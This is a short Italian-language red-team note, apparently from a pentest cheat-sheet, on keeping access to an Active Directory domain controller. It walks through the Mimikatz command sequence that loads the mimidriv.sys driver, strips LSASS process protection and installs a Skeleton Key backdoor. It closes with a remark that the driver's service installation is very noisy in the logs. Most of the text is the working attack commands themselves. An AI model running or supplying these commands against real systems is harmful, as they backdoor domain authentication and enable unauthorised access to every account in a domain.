# Persistence - Skeleton Key - Mimikatz Driver on-disk

* In caso lsass sia eseguito come processo protetto, possiamo ancora usare Skeleton Key ma c'e' bisogno del driver mimikatz (mimidriv.sys) sul disco del DC target

```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

#### NOTARE CHE IL COMANDO SOVRASTANTE RISULTA ESSERE DAVVERO MOLTO NOISY nei LOG - Service Installation (Kernel mode driver)
